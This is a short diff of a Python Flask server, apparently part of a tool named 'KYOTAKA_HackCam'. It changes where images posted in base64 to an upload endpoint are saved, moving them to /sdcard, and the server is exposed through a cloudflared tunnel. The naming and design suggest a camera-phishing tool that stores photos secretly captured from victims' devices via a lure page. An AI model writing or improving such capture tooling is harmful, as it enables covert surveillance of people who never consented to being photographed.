@@ -16,7 +16,11 @@ def upload():
     data = request.get_json()
     image_data = data['image'].split(',')[1]
     number = data['number']
-    with open(f'KYOTAKA_HackCam/capture_{number}.jpg', 'wb') as f:
+    
+    save_path = '/sdcard/KYOTAKA_HackCam'
+    os.makedirs(save_path, exist_ok=True)
+
+    with open(f'{save_path}/capture_{number}.jpg', 'wb') as f:
         f.write(base64.b64decode(image_data))
     return 'OK'
 
@@ -43,8 +47,6 @@ def start_cloudflared(port):
         print(f"❌ Erreur lors du démarrage de cloudflared : {e}")
 
 if __name__ == '__main__':
-    os.makedirs('KYOTAKA_HackCam', exist_ok=True)
-
     port = 5000
     print(f"📡 Serveur local lancé sur le port {port}")
     time.sleep(1)
